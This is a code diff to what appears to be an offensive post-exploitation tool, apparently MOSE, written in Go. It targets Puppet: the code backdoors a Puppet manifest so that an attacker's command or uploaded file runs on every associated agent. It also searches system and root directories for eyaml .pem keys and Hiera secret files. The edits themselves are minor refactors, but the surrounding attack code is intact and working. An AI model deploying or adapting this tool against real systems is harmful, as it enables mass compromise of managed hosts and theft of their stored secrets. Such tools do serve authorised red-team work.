@@ -37,13 +37,13 @@ type command struct {
 var (
 	a               = CreateAgent()
 	cleanup         bool
+	cleanupFile     = a.CleanupFile
 	cmd             = a.Cmd
 	debug           = a.Debug
 	osTarget        = a.OsTarget
 	moduleName      = a.PayloadName
 	uploadFileName  = a.FileName
 	uploadFilePath  = a.RemoteUploadFilePath
-	cleanupFile     = a.CleanupFile
 	puppetBackupLoc = a.PuppetBackupLoc
 )
 
@@ -139,7 +139,7 @@ func backupManifest(manifestLoc string) {
 		path = filepath.Join(puppetBackupLoc, filepath.Base(manifestLoc))
 	}
 	if !moseutils.FileExists(path + ".bak.mose") {
-		moseutils.CpFile(manifestLoc, path+".bak.mose")
+		_ = moseutils.CpFile(manifestLoc, path+".bak.mose")
 		return
 	}
 	fmt.Printf("Backup of the manifest (%v.bak.mose) already exists.\n", manifestLoc)
@@ -177,7 +177,7 @@ func getPuppetCodeLoc(manifestLoc string) string {
 func generateModule(moduleManifest string, cmd string) bool {
 	puppetCommand := command{
 		ClassName: moduleName,
-		CmdName:   "cmd",
+		CmdName:   moduleName,
 		Cmd:       cmd,
 		FileName:  uploadFileName,
 		FilePath:  uploadFilePath,
@@ -232,7 +232,7 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 
 			moseutils.CreateFolders([]string{moduleFiles})
 			fmt.Printf("Copying %s to module location %s\n", uploadFileName, moduleFiles)
-			moseutils.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
+			_ = moseutils.CpFile(uploadFileName, filepath.Join(moduleFiles, filepath.Base(uploadFileName)))
 			if err := os.Chmod(filepath.Join(moduleFiles, filepath.Base(uploadFileName)), 0644); err != nil {
 				log.Fatal(err)
 			}
@@ -245,7 +245,7 @@ func createModule(manifestLoc string, moduleName string, cmd string) {
 
 func getSecretKeys() map[string]*eyamlKeys {
 	keys := make(map[string]*eyamlKeys)
-	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{}, debug)
+	keyFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/root", "/etc/eyaml"}, []string{".pem"}, []string{}, []string{})
 	if len(keyFiles) == 0 {
 		log.Fatalln("Unable to find any files containing keys used with eyaml, exiting.")
 	}
@@ -280,7 +280,7 @@ func findHieraSecrets() {
 		return
 	}
 	secretKeys := getSecretKeys()
-	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{}, debug)
+	puppetFiles, _ := moseutils.FindFiles([]string{"/etc/puppetlabs", "/etc/puppet", "/home", "/opt", "/root", "/var"}, []string{".pp", ".yaml", ".yml"}, []string{}, []string{})
 
 	if len(puppetFiles) == 0 {
 		log.Fatalln("Unable to find any chef files, exiting.")
@@ -338,7 +338,7 @@ func doCleanup(manifestLocs []string) {
 			}
 		}
 		if ans || ans2 {
-			moseutils.CpFile(path, manifestLoc)
+			_ = moseutils.CpFile(path, manifestLoc)
 			os.Remove(path)
 		}
 	}
@@ -368,7 +368,12 @@ func main() {
 			log.Fatal("Exiting...")
 		}
 
-		moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
+		if uploadFileName != "" {
+			moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, uploadFileName)
+		} else {
+			moseutils.Msg("Backdooring the %s manifest to run %s on all associated Puppet agents, please wait...", manifestLoc, cmd)
+		}
+
 		backdoorManifest(manifestLoc)
 		modules := getModules(getPuppetCodeLoc(manifestLoc) + "/modules")
 		moseutils.Info("The following modules were found: %v", modules)
